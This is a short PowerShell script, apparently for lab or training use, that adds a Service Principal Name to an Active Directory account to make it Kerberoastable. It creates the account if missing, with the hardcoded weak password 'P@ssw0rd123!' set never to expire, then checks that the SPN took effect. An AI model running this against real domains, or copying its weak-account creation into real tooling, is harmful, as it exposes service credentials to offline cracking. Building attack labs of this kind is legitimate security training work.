<#
.SYNOPSIS
Adds a Service Principal Name (SPN) to a specified Active Directory user account.

.DESCRIPTION
This script adds a Service Principal Name (SPN) to an AD user account.  
SPNs are used in Kerberos authentication. If an SPN is registered to a user account, 
that account can be targeted with Kerberoasting attacks.  

If the specified user does not exist, the script will create it with a default password 
(P@ssw0rd123!) and enable the account.

.REQUIREMENTS
- ActiveDirectory PowerShell module (RSAT tools).
- Permissions to modify the target user account (e.g., GenericWrite or higher).
- Domain-joined machine.

.PARAMETER UserIdentity
The AD user to modify (e.g., "svc-sql").  
If the user does not exist, a new account will be created.

.PARAMETER ServicePrincipalName
The SPN string to add (e.g., "MSSQLSvc/sql.srv.local:1433").

.EXAMPLE
PS> .\add_spn_for_kerberosting.ps1 -UserIdentity "svc-sql" -ServicePrincipalName "MSSQLSvc/sql.srv.local:1433"
Adds the MSSQLSvc SPN to the svc-sql account, enabling Kerberoasting attacks.

.NOTES
Author: Phoenix (example)
Attack Technique: SPN Abuse / Kerberoasting
Use only in lab or test environments.
#>

param(
	[Parameter(Mandatory=$true)]
	[string]$UserIdentity,

	[Parameter(Mandatory=$true)]
	[string]$ServicePrincipalName
)

# Ensure the AD module is available
if (-not (Get-Module -ListAvailable -Name ActiveDirectory))
{
	Write-Host "[-] ActiveDirectory module not found. Please install RSAT tools." -ForegroundColor Red
	exit 1
}
Import-Module ActiveDirectory

$user = Get-ADUser -Identity $UserIdentity -Properties userAccountControl -ErrorAction SilentlyContinue
if (-not $user)
{
	Write-Host "[*] User '$UserIdentity' not found. Creating new user..." -ForegroundColor Cyan

	New-ADUser -Name $UserIdentity `
		-SamAccountName $UserIdentity `
		-AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
		-Enabled $true `
		-PasswordNeverExpires $true

	$user = Get-ADUser -Identity $UserIdentity -Properties userAccountControl
	Write-Host "[+] User '$UserIdentity' created successfully." -ForegroundColor Green
} else
{
	Write-Host "[*] User '$UserIdentity' exists. Adding SPN..." -ForegroundColor Cyan
}

Set-ADUser -Identity $UserIdentity -ServicePrincipalNames @{Add=$ServicePrincipalName}
Write-Host "[+] SPN '$ServicePrincipalName' added to '$UserIdentity'." -ForegroundColor Green

##################################################
#  CHECKER: VERIFY SPN WAS ADDED                #
##################################################

$userCheck = Get-ADUser -Identity $UserIdentity -Properties ServicePrincipalNames
if ($userCheck.ServicePrincipalNames -contains $ServicePrincipalName)
{
	Write-Host "[SUCCESS] SPN successfully applied to '$UserIdentity'!" -ForegroundColor Green
	exit 0
} else
{
	Write-Host "[FAIL] SPN was not applied to '$UserIdentity'!" -ForegroundColor Red
	exit 1
}
